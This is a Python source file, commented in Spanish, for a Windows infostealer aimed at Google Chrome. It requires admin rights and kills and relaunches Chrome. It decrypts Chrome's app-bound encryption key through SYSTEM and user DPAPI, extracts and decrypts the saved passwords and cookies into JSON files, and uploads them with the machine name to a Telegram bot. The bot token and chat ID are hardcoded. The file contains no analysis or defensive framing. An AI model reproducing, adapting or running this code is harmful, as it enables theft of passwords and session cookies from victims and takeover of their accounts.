import ctypes
import sys
import os
import json
import time
import binascii
import logging
from datetime import datetime
from Crypto.Cipher import AES, ChaCha20_Poly1305
import sqlite3
import pathlib
from pypsexec.client import Client
from smbprotocol.exceptions import SMBResponseException
import shutil
import getpass
import requests
import win32crypt
import psutil
import subprocess
import platform

# Parámetros de tu bot de Telegram
TELEGRAM_TOKEN = "7746569917:AAG3u31Grbt-6CC87RqKaQsrixM2EhmUakc"
CHAT_ID = "-4895094517"  # Puedes obtenerlo con @userinfobot

def setup_logging(verbose):
    """Configure logging based on verbosity."""
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s')

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        logging.error(f"Failed to check admin privileges: {e}")
        return False

def get_encryption_key():
    """Retrieve and decrypt the Chrome encryption key."""
    user_profile = os.environ.get('USERPROFILE')
    if not user_profile:
        logging.error("USERPROFILE environment variable not found.")
        sys.exit(1)

    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logging.error(f"Failed to read Local State file: {e}")
        sys.exit(1)

    app_bound_encrypted_key = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
    if not app_bound_encrypted_key:
        logging.error("App-bound encrypted key not found in Local State.")
        sys.exit(1)

    arguments = "-c \"" + """import win32crypt
import binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
""".replace("\n", ";") + "\""

    c = Client("localhost")
    try:
        c.connect()
        c.create_service()

        if binascii.a2b_base64(app_bound_encrypted_key)[:4] != b"APPB":
            logging.error("Invalid app-bound encrypted key format.")
            sys.exit(1)

        app_bound_encrypted_key_b64 = binascii.b2a_base64(
            binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()

        # Decrypt with SYSTEM DPAPI
        encrypted_key_b64, stderr, rc = c.run_executable(
            sys.executable, arguments=arguments.format(app_bound_encrypted_key_b64), use_system_account=True
        )
        if rc != 0:
            logging.error(f"SYSTEM DPAPI decryption failed: {stderr.decode()}")
            sys.exit(1)

        # Decrypt with user DPAPI
        decrypted_key_b64, stderr, rc = c.run_executable(
            sys.executable, arguments=arguments.format(encrypted_key_b64.decode().strip()), use_system_account=False
        )
        if rc != 0:
            logging.error(f"User DPAPI decryption failed: {stderr.decode()}")
            sys.exit(1)

        decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
    except Exception as e:
        logging.error(f"Error during key decryption process: {e}")
        sys.exit(1)
    finally:
        for _ in range(3):
            try:
                c.remove_service()
                break
            except SMBResponseException as e:
                if "STATUS_CANNOT_DELETE" in str(e):
                    logging.warning(f"Failed to remove service: {e}. Retrying...")
                    time.sleep(1)
                else:
                    logging.error(f"Failed to remove service: {e}")
                    sys.exit(1)
            except Exception as e:
                logging.error(f"Unexpected error during service removal: {e}")
                sys.exit(1)
        else:
            logging.warning("Failed to remove service after retries. Manual cleanup may be required.")
        c.disconnect()

    # Decrypt key with AES256GCM or ChaCha20Poly1305
    aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
    chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")

    flag = decrypted_key[0]
    iv = decrypted_key[1:1+12]
    ciphertext = decrypted_key[1+12:1+12+32]
    tag = decrypted_key[1+12+32:]

    try:
        if flag == 1:
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
        elif flag == 2:
            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
        else:
            logging.error(f"Unsupported encryption flag: {flag}")
            sys.exit(1)
        key = cipher.decrypt_and_verify(ciphertext, tag)
    except ValueError as e:
        logging.error(f"Key decryption failed: {e}")
        sys.exit(1)

    return key

def decrypt_v20(encrypted_value, key, data_type="data"):
    """Decrypt v20 encrypted data (cookie or password) using AES256GCM."""
    try:
        iv = encrypted_value[3:3+12]
        encrypted_data = encrypted_value[3+12:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        decrypted_data = cipher.decrypt_and_verify(encrypted_data, tag)
        if data_type == "cookie":
            return decrypted_data[32:].decode('utf-8')
        return decrypted_data.decode('utf-8')
    except ValueError as e:
        logging.warning(f"Failed to decrypt {data_type}: {e}")
        return None

def fetch_cookies(cookie_db_path):
    """Fetch v20 cookies from Chrome's Cookies database."""
    user_profile = os.environ.get('USERPROFILE')
    
    try:
        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies;")
        cookies = cur.fetchall()
        cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
        con.close()
        return cookies_v20
    except sqlite3.OperationalError as e:
        if "database is locked" in str(e):
            logging.error("Cookies database is locked. Please close Chrome and try again.")
            sys.exit(1)
        else:
            logging.error(f"Failed to fetch cookies: {e}")
            return []
    except Exception as e:
        logging.error(f"Unexpected error while fetching cookies: {e}")
        return []

def fetch_passwords(password_db_path):
    """Fetch v20 passwords from Chrome's Login Data database."""
    user_profile = os.environ.get('USERPROFILE')
    try:
        con = sqlite3.connect(pathlib.Path(password_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;")
        passwords = cur.fetchall()
        passwords_v20 = [p for p in passwords if p[2][:3] == b"v20"]
        con.close()
        return passwords_v20
    except sqlite3.OperationalError as e:
        if "database is locked" in str(e):
            logging.error("Passwords database is locked. Please close Chrome and try again.")
            sys.exit(1)
        else:
            logging.error(f"Failed to fetch passwords: {e}")
            return []
    except Exception as e:
        logging.error(f"Unexpected error while fetching passwords: {e}")
        return []

def output_data(cookies, passwords, output_format, output_file, key):
    """Output decrypted cookies and passwords in the specified format."""
    cookie_data = [
        {"host_key": c[0], "name": c[1], "value": decrypt_v20(c[2], key, "cookie")}
        for c in cookies
        if decrypt_v20(c[2], key, "cookie") is not None
    ]
    password_data = [
        {"origin_url": p[0], "username": p[1], "password": decrypt_v20(p[2], key, "password")}
        for p in passwords
        if decrypt_v20(p[2], key, "password") is not None
    ]

    if output_format == "json":
        output = {"cookies": cookie_data, "passwords": password_data}
        if output_file:
            try:
                with open(output_file, 'w', encoding='utf-8') as f:
                    json.dump(output, f, indent=2)
                logging.info(f"Data written to {output_file}")
            except IOError as e:
                logging.error(f"Failed to write JSON file: {e}")
                sys.exit(1)
        else:
            print(json.dumps(output, indent=2))

    else:  # console
        if cookie_data:
            print("Decrypted Cookies:")
            for c in cookie_data:
                print(f"{c['host_key']} {c['name']} {c['value']}")
        if password_data:
            print("\nDecrypted Passwords:")
            for p in password_data:
                print(f"{p['origin_url']} {p['username']} {p['password']}")

def copiar_archivos_chrome():
    # Obtener nombre de usuario y perfil
    usuario = getpass.getuser()
    user_profile = fr"C:\Users\{usuario}"

    # Rutas originales de Chrome
    cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
    password_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Login Data"

    # Ruta de destino en LOCALAPPDATA
    destino_base = os.path.join(os.environ['LOCALAPPDATA'])
    os.makedirs(destino_base, exist_ok=True)

    # Rutas destino
    cookie_dest = os.path.join(destino_base, "Cookies")
    password_dest = os.path.join(destino_base, "Login Data")

    # Copiar archivos
    try:
        if os.path.exists(password_db_path):
            shutil.copy2(password_db_path, password_dest)
            print(f"Login Data copiado a: {password_dest}")
        else:
            print(f"Login Data no encontrado en: {password_db_path}")
            
        if os.path.exists(cookie_db_path):
            shutil.copy2(cookie_db_path, cookie_dest)
            print(f"Cookie copiado a: {cookie_dest}")
        else:
            print(f"Cookie no encontrado en: {cookie_db_path}")

        
    except Exception as e:
        print(f"Error durante la copia: {e}")


def close_chrome():
    """Cierra todas las instancias de Chrome"""
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] in ('chrome.exe'):
                proc.kill()
        time.sleep(2)  # Espera para asegurar el cierre
        return True
    except Exception as e:
        logging.error(f"Error al cerrar Chrome: {e}")
        return False

def open_chrome():
    """Abre Chrome nuevamente"""
    try:
        chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
        subprocess.Popen(chrome_path)
        return True
    except Exception as e:
        logging.error(f"Error al abrir Chrome: {e}")
        return False


def enviar_a_telegram(mensaje):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": mensaje,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Cookies enviadas a Telegram.")
        else:
            print(f"Error al enviar mensaje: {response.text}")
    except Exception as e:
        print(f"Excepción al enviar a Telegram: {e}")

def enviar_archivo_telegram(ruta_archivo, mensaje_caption=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    
    try:
        with open(ruta_archivo, 'rb') as file:
            files = {"document": file}
            data = {
                "chat_id": CHAT_ID,
                "caption": mensaje_caption or "Archivo enviado",
                "parse_mode": "HTML"
            }
            response = requests.post(url, data=data, files=files)
            if response.status_code == 200:
                print("Archivo enviado correctamente.")
            else:
                print(f"Error al enviar archivo: {response.text}")
    except Exception as e:
        print(f"Excepción al enviar archivo: {e}")
        
def main():
    """Función principal para extraer y descifrar cookies y contraseñas de Chrome."""
    setup_logging(verbose=False)  # Siempre en modo verbose para ver todos los detalles

    if not is_admin():
        logging.error("Este script requiere privilegios de administrador para ejecutarse.")
        sys.exit(1)
    # Llamar a la función
    close_chrome()
    time.sleep(1)
    copiar_archivos_chrome()
    open_chrome()
    # Obtener la clave de cifrado
    key = get_encryption_key()
    logging.debug(f"Clave descifrada: {binascii.b2a_base64(key).decode().strip()}")

    # Ruta de destino en LOCALAPPDATA
    destino_base = os.path.join(os.environ['LOCALAPPDATA'])
    os.makedirs(destino_base, exist_ok=True)
    cookie_dest = os.path.join(destino_base, "Cookies")
    password_dest = os.path.join(destino_base, "Login Data")
    # Obtener todos los datos
    cookies = fetch_cookies(cookie_dest)
    passwords = fetch_passwords(password_dest)

    if not cookies and not passwords:
        logging.error("No se encontraron datos para procesar. Saliendo.")
        sys.exit(1)

    # Ruta a la carpeta Documentos
    documents_path = os.path.join(os.environ['USERPROFILE'], 'Documents')
    
    # Timestamp para los nombres de archivo
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    
    # Procesar y guardar cookies
    if cookies:
        cookie_data = [
            {"domain": c[0], "name": c[1], "value": decrypt_v20(c[2], key, "cookie")}
            for c in cookies
            if decrypt_v20(c[2], key, "cookie") is not None
        ]
        cookie_file = os.path.join(documents_path, f"chrome_cookies.json")
        try:
            with open(cookie_file, 'w', encoding='utf-8') as f:
                json.dump(cookie_data, f, indent=2)
            logging.info(f"Cookies guardadas correctamente en: {cookie_file}")
        except IOError as e:
            logging.error(f"Error al guardar las cookies: {e}")

    # Procesar y guardar contraseñas
    if passwords:
        password_data = [
            {"origin_url": p[0], "username": p[1], "password": decrypt_v20(p[2], key, "password")}
            for p in passwords
            if decrypt_v20(p[2], key, "password") is not None
        ]
        password_file = os.path.join(documents_path, f"chrome_passwords.json")
        try:
            with open(password_file, 'w', encoding='utf-8') as f:
                json.dump(password_data, f, indent=2)
            logging.info(f"Contraseñas guardadas correctamente en: {password_file}")
        except IOError as e:
            logging.error(f"Error al guardar las contraseñas: {e}")
    try:
        enviar_archivo_telegram(f"{os.path.join(documents_path, "chrome_passwords.json")}", platform.node())
        enviar_archivo_telegram(f"{os.path.join(documents_path, "chrome_cookies.json")}", platform.node())
    except:
        pass
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Ejecución interrumpida por el usuario.")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Error inesperado: {e}")
        sys.exit(1)
